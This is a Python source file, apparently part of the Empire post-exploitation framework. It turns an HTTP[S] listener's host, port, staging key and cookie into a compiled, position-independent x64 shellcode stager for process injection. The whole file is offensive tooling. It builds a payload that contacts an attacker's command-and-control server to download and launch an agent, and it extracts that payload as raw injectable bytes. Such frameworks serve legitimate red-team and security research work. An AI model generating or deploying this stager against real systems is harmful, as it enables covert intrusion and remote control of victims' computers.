"""PIC shellcode compiler utility.

Compiles a position-independent C stager into raw x64 shellcode
for process injection via BOF modules. Functionally equivalent to
the c_launcher stager but outputs raw shellcode instead of a PE.

Requires: x86_64-w64-mingw32-gcc (MinGW-w64 cross-compiler)
"""

import base64
import logging
import subprocess
import tempfile
from pathlib import Path

from empire.server.common import packets
from empire.server.core.exceptions import ModuleExecutionException

log = logging.getLogger(__name__)


def _string_to_wchar_initializer(s: str) -> str:
    """Convert a Python string to a C WCHAR array initializer.

    Example: "hello" -> "{'h','e','l','l','o',0}"

    Special characters (quotes, backslashes, non-ASCII) are emitted
    as hex literals to avoid C escaping issues.
    """
    _MAX_PRINTABLE = 126
    _MIN_PRINTABLE = 32
    parts = []
    for c in s:
        if c in {"'", "\\"} or ord(c) > _MAX_PRINTABLE or ord(c) < _MIN_PRINTABLE:
            parts.append(f"0x{ord(c):04x}")
        else:
            parts.append(f"'{c}'")
    return "{" + ",".join(parts) + ",0}"


def generate_pic_shellcode(
    main_menu,
    listener_name: str,
    language: str,
) -> bytes:
    """Generate PIC shellcode that stages an Empire agent via HTTP[S].

    Extracts listener parameters (same logic as c_launcher stager),
    substitutes them into the PIC C template, compiles with MinGW,
    and extracts the .text section as raw injectable shellcode.

    Args:
        main_menu: Empire MainMenu instance (DI container).
        listener_name: Name of an active HTTP[S] listener.
        language: Agent language (powershell, csharp, ironpython).

    Returns:
        Raw x64 shellcode bytes.

    Raises:
        ModuleExecutionException: On invalid listener, missing compiler,
            or compilation failure.
    """
    listener = main_menu.listenersv2.get_active_listener_by_name(listener_name)
    if not listener:
        raise ModuleExecutionException(f"Invalid listener: {listener_name}")
    if listener.info.get("Name") != "HTTP[S]":
        raise ModuleExecutionException("PIC shellcode only supports HTTP[S] listeners")

    # Extract listener parameters (mirrors c_launcher.py lines 66-93)
    host = listener.options["Host"]["Value"]
    port = listener.options["Port"]["Value"]
    staging_key = listener.options["StagingKey"]["Value"]
    cookie_name = listener.options["Cookie"]["Value"]

    profile = listener.options["DefaultProfile"]["Value"]
    uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
    staging_path = f"/{uris[0]}"

    routing_packet = packets.build_routing_packet(
        staging_key,
        sessionID="00000000",
        language=language,
        meta="STAGE0",
        additional="SHELLCODE",
        encData="",
    )
    b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
    cookie_value = f"{cookie_name}={b64_routing_packet}"

    use_https = "TRUE" if "https" in host.lower() else "FALSE"
    clean_host = (
        host.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
    )

    # Resolve data paths
    data_dir = Path(main_menu.installPath) / "data" / "misc"
    template_path = data_dir / "windows_shellcode.c"
    linker_script = data_dir / "pic_shellcode.ld"
    if not template_path.exists():
        raise ModuleExecutionException(
            f"PIC shellcode template not found at {template_path}"
        )
    if not linker_script.exists():
        raise ModuleExecutionException(
            f"PIC linker script not found at {linker_script}"
        )
    code = template_path.read_text()
    code = code.replace("{{ host }}", _string_to_wchar_initializer(clean_host))
    code = code.replace("{{ port }}", str(port))
    code = code.replace("{{ path }}", _string_to_wchar_initializer(staging_path))
    code = code.replace("{{ use_https }}", use_https)
    code = code.replace("{{ cookie }}", _string_to_wchar_initializer(cookie_value))
    return _compile_pic(code, linker_script)


def _compile_pic(code: str, linker_script: Path) -> bytes:
    """Compile substituted C code into raw PIC shellcode.
    Uses a linker script to merge .rdata/.data/.bss into .text so that
    objcopy -O binary -j .text produces a self-contained flat binary
    with no dangling RIP-relative references.
    """
    compiler = "x86_64-w64-mingw32-gcc"
    objcopy = "x86_64-w64-mingw32-objcopy"

    with tempfile.TemporaryDirectory() as tmp_dir:
        tmp = Path(tmp_dir)
        c_file = tmp / "shellcode.c"
        pe_file = tmp / "shellcode.exe"
        bin_file = tmp / "shellcode.bin"

        c_file.write_text(code)

        compile_args = [
            compiler,
            "-nostdlib",
            "-Os",
            "-s",
            "-fno-ident",
            "-fno-asynchronous-unwind-tables",
            "-fno-toplevel-reorder",
            "-T",
            str(linker_script),
            str(c_file),
            "-o",
            str(pe_file),
            "-Wl,--no-seh",
            "-Wl,-e,AlignRSP",
        ]

        try:
            subprocess.run(compile_args, capture_output=True, text=True, check=True)
        except FileNotFoundError:
            raise ModuleExecutionException(
                f"{compiler} not found. Install mingw-w64: "
                "apt install gcc-mingw-w64-x86-64"
            ) from None
        except subprocess.CalledProcessError as e:
            log.error("PIC shellcode compilation failed: %s", e.stderr)
            raise ModuleExecutionException(
                f"PIC shellcode compilation failed: {e.stderr}"
            ) from e

        extract_args = [
            objcopy,
            "-O",
            "binary",
            "-j",
            ".text",
            str(pe_file),
            str(bin_file),
        ]

        try:
            subprocess.run(extract_args, capture_output=True, text=True, check=True)
        except subprocess.CalledProcessError as e:
            log.error("objcopy .text extraction failed: %s", e.stderr)
            raise ModuleExecutionException(
                f"objcopy .text extraction failed: {e.stderr}"
            ) from e

        if not bin_file.exists() or bin_file.stat().st_size == 0:
            raise ModuleExecutionException(
                "PIC shellcode extraction produced empty output"
            )

        return bin_file.read_bytes()
